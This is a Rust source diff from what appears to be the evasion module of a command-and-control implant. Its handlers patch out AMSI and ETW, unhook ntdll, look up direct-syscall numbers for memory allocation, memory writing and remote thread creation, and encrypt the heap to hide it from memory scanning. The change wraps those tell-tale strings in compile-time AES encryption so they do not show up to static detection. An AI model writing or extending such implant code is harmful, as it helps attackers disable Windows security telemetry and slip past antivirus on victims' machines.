@@ -2,6 +2,8 @@
 
 use super::{DispatchResult, AgentAction, wrap_result};
 use crate::agent::syscalls;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn handle_patch_amsi() -> DispatchResult {
     wrap_result(crate::agent::evasion::patch_amsi())
@@ -19,11 +21,11 @@ pub fn handle_patch_all() -> DispatchResult {
     let mut results = Vec::new();
     match crate::agent::evasion::patch_amsi() {
         Ok(msg) => results.push(format!("[+] {}", msg)),
-        Err(e) => results.push(format!("[-] AMSI: {}", e)),
+        Err(e) => results.push(format!("{}: {}", aes_str!("[-] AMSI"), e)),
     }
     match crate::agent::evasion::patch_etw() {
         Ok(msg) => results.push(format!("[+] {}", msg)),
-        Err(e) => results.push(format!("[-] ETW: {}", e)),
+        Err(e) => results.push(format!("{}: {}", aes_str!("[-] ETW"), e)),
     }
     match crate::agent::evasion::unhook_ntdll() {
         Ok(msg) => results.push(format!("[+] {}", msg)),
@@ -34,8 +36,12 @@ pub fn handle_patch_all() -> DispatchResult {
 
 pub fn handle_syscall_check() -> DispatchResult {
     let mut lines = Vec::new();
-    for name in ["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"] {
-        let ssn = unsafe { syscalls::win::get_syscall_number(name) };
+    let names = [
+        aes_str!("NtAllocateVirtualMemory"), aes_str!("NtProtectVirtualMemory"),
+        aes_str!("NtWriteVirtualMemory"), aes_str!("NtCreateThreadEx"),
+    ];
+    for name in &names {
+        let ssn = unsafe { syscalls::win::get_syscall_number(name.as_str()) };
         lines.push(format!("{}: {}", name, ssn.map(|n| format!("SSN 0x{:X}", n)).unwrap_or("NOT FOUND".into())));
     }
     let gadget = unsafe { syscalls::win::find_syscall_gadget() };
@@ -45,7 +51,7 @@ pub fn handle_syscall_check() -> DispatchResult {
     if let Some((base, size)) = crate::agent::evasion::agent_text_section() {
         lines.push(format!(".text section:  base=0x{:X}  size={} bytes", base as usize, size));
     } else {
-        lines.push(".text section:  not found".into());
+        lines.push(aes_str!(".text section:  not found"));
     }
 
     DispatchResult::Reply(lines.join("\n"), String::new(), 0, AgentAction::None)
@@ -97,7 +103,7 @@ pub fn handle_encrypt_heap_aes() -> DispatchResult {
                 nonce.zeroize();
                 return DispatchResult::Reply(
                     String::new(),
-                    "key store mutex poisoned; heap encrypted but decrypt key lost".into(),
+                    aes_str!("key store mutex poisoned; heap encrypted but decrypt key lost"),
                     1,
                     AgentAction::None,
                 );
@@ -117,7 +123,7 @@ pub fn handle_decrypt_heap_aes() -> DispatchResult {
     let state = match HEAP_AES_STATE.lock() {
         Ok(g) => g.clone(),
         Err(_) => return DispatchResult::Reply(
-            String::new(), "key store mutex poisoned".into(), 1, AgentAction::None,
+            String::new(), aes_str!("key store mutex poisoned"), 1, AgentAction::None,
         ),
     };
 
@@ -125,7 +131,7 @@ pub fn handle_decrypt_heap_aes() -> DispatchResult {
         Some(kn) => kn,
         None => return DispatchResult::Reply(
             String::new(),
-            "no AES key stored — run evasion:encrypt_heap_aes first".into(),
+            aes_str!("no AES key stored — run evasion:encrypt_heap_aes first"),
             1,
             AgentAction::None,
         ),
